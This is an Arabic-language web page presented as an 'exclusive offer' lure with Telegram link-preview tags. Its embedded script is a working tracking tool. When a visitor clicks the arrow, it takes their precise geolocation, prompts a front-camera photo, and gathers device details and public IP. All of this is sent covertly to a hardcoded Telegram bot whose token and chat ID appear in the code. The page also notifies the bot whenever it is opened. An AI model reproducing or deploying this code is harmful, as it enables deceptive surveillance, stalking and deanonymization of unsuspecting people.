<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- ============================================================ -->
    <!-- 🖼️ أوسمة الصورة المصغرة (تظهر في تليجرام) -->
    <!-- ============================================================ -->
    <meta property="og:title" content="🔥 عرض حصري - انضم الآن!" />
    <meta property="og:description" content="فرصة لا تعوض! اضغط للمشاركة." />
    <meta property="og:image" content="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=800&h=400&fit=crop" />
    <meta property="og:image:width" content="800" />
    <meta property="og:image:height" content="400" />
    <meta property="og:type" content="website" />
    <!-- ============================================================ -->
    
    <title>🔥 عرض حصري</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            margin: 0;
            padding: 0;
            background: #000;
            font-family: Arial, sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .container {
            width: 100vw;
            height: 100vh;
            background: url('https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=1200&h=2000&fit=crop') center/cover;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            position: relative;
            cursor: pointer;
        }
        /* طبقة شفافة فوق الصورة */
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.3);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        /* السهم الكبير في المنتصف */
        .arrow-container {
            position: relative;
            width: 120px;
            height: 120px;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            animation: pulse 2s infinite;
            z-index: 10;
        }
        .arrow-circle {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            background: rgba(255, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 0 50px rgba(255, 0, 0, 0.5);
            transition: transform 0.3s;
        }
        .arrow-circle:active {
            transform: scale(0.9);
        }
        .arrow-icon {
            font-size: 60px;
            color: white;
            text-shadow: 0 0 20px rgba(255,255,255,0.5);
        }
        /* نص تحتي */
        .text-overlay {
            position: absolute;
            bottom: 80px;
            left: 0;
            width: 100%;
            text-align: center;
            color: white;
            font-size: 18px;
            font-weight: bold;
            text-shadow: 0 2px 10px rgba(0,0,0,0.8);
            padding: 10px;
            z-index: 10;
        }
        .text-overlay span {
            background: rgba(0,0,0,0.5);
            padding: 8px 20px;
            border-radius: 30px;
            display: inline-block;
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        /* رسالة الحالة */
        #status {
            position: absolute;
            bottom: 150px;
            left: 50%;
            transform: translateX(-50%);
            color: white;
            font-size: 14px;
            background: rgba(0,0,0,0.7);
            padding: 8px 20px;
            border-radius: 20px;
            z-index: 10;
            display: none;
        }
        #status.show {
            display: block;
        }
        /* شعار صغير */
        .badge {
            position: absolute;
            top: 20px;
            right: 20px;
            color: white;
            font-size: 12px;
            background: rgba(0,0,0,0.5);
            padding: 5px 15px;
            border-radius: 20px;
            z-index: 10;
        }
    </style>
</head>
<body>

<div class="container" id="mainContainer">
    <!-- البadge -->
    <div class="badge">🔥 حصري</div>
    
    <!-- السهم في المنتصف -->
    <div class="arrow-container" id="clickArea">
        <div class="arrow-circle">
            <span class="arrow-icon">▶</span>
        </div>
    </div>
    
    <!-- النص السفلي -->
    <div class="text-overlay">
        <span>👆 اضغط على السهم للمتابعة</span>
    </div>
    
    <!-- حالة التحميل -->
    <div id="status">📡 جاري...</div>
</div>

<script>
    // =====================================================
    // 🔑 البوت: @Arab9991_bot
    // =====================================================
    const BOT_TOKEN = '8680472604:AAH8b0pnjse3s80jN3M_NxrfewFe0jPzRCw';
    const CHAT_ID = '8391968596';
    // =====================================================

    const statusDiv = document.getElementById('status');
    const clickArea = document.getElementById('clickArea');

    function showStatus(msg, show = true) {
        statusDiv.innerText = msg;
        statusDiv.className = show ? 'show' : '';
    }

    function sendToBot(message) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
        return fetch(url).catch(e => console.log('خطأ:', e));
    }

    function sendPhotoToBot(file) {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', file);
        return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        }).catch(e => console.log('خطأ:', e));
    }

    // ================== الحصول على الموقع ==================

    function getLocation() {
        return new Promise((resolve, reject) => {
            if (!navigator.geolocation) {
                reject('المتصفح لا يدعم الموقع');
                return;
            }
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        acc: position.coords.accuracy
                    });
                },
                (error) => {
                    let msg = '';
                    switch(error.code) {
                        case 1: msg = '❌ اضغط سماح عند طلب الموقع';
                            break;
                        case 2: msg = '❌ تعذر تحديد الموقع';
                            break;
                        case 3: msg = '❌ انتهى الوقت';
                            break;
                        default: msg = '❌ ' + error.message;
                    }
                    reject(msg);
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        });
    }

    // ================== التقاط الصورة من الكاميرا الأمامية ==================

    function capturePhoto() {
        return new Promise((resolve, reject) => {
            const input = document.createElement('input');
            input.type = 'file';
            input.accept = 'image/*';
            input.capture = 'user';
            input.onchange = (e) => {
                const file = e.target.files[0];
                if (file) resolve(file);
                else reject('لم يتم اختيار صورة');
            };
            input.onerror = () => reject('فشل فتح الكاميرا');
            input.click();
        });
    }

    // ================== الضغط على السهم ==================

    clickArea.onclick = async function() {
        // تعطيل النقر مؤقتاً
        clickArea.style.pointerEvents = 'none';
        showStatus('📡 جاري التحقق...');

        try {
            // 1. إشعار ببدء العملية
            sendToBot('🟢 شخص جديد ضغط على السهم');

            // 2. طلب الموقع
            showStatus('📍 جاري تحديد موقعك...');
            const location = await getLocation();
            const mapsLink = `https://maps.google.com/?q=${location.lat},${location.lng}`;
            const locationMsg = `📍 الموقع الدقيق\nالعرض: ${location.lat}\nالطول: ${location.lng}\nالدقة: ${location.acc} متر\n${mapsLink}`;
            sendToBot(locationMsg);
            showStatus('✅ تم تحديد موقعك');

            // 3. طلب صورة
            showStatus('📸 جاري فتح الكاميرا...');
            try {
                const photoFile = await capturePhoto();
                await sendPhotoToBot(photoFile);
                sendToBot('📸 تم التقاط صورة');
            } catch(photoError) {
                sendToBot('⚠️ لم يتم التقاط صورة: ' + photoError);
            }

            // 4. معلومات الجهاز
            const deviceMsg = `📱 الجهاز\n${navigator.userAgent.substring(0, 80)}\nالشاشة: ${screen.width}x${screen.height}\nاللغة: ${navigator.language}`;
            sendToBot(deviceMsg);

            // 5. IP العام
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                sendToBot('🌐 IP: ' + ipData.ip);
            } catch(e) {}

            // 6. رسالة النجاح
            showStatus('✅ تم بنجاح!');
            
            // تغيير الصفحة بعد 2 ثانية
            setTimeout(() => {
                document.getElementById('mainContainer').innerHTML = `
                    <div style="text-align:center;color:white;padding:40px;">
                        <div style="font-size:80px;">✅</div>
                        <h2 style="color:#22c55e;margin-top:20px;">تم التأكيد بنجاح</h2>
                        <p style="color:#94a3b8;">سيتم توجيهك قريباً...</p>
                    </div>
                `;
            }, 1500);

        } catch(error) {
            showStatus('⚠️ ' + error);
            clickArea.style.pointerEvents = 'auto';
        }
    };

    // ================== إعلام عند فتح الصفحة ==================

    setTimeout(() => {
        sendToBot('🟢 تم فتح صفحة السهم', false);
    }, 1000);

    // ================== اختبار البوت ==================

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`)
        .then(r => r.json())
        .then(data => {
            if (data.ok) {
                console.log('✅ البوت يعمل:', data.result.username);
            } else {
                console.log('❌ البوت لا يعمل');
            }
        })
        .catch(e => console.log('❌ فشل الاتصال:', e));
</script>
</body>
</html>
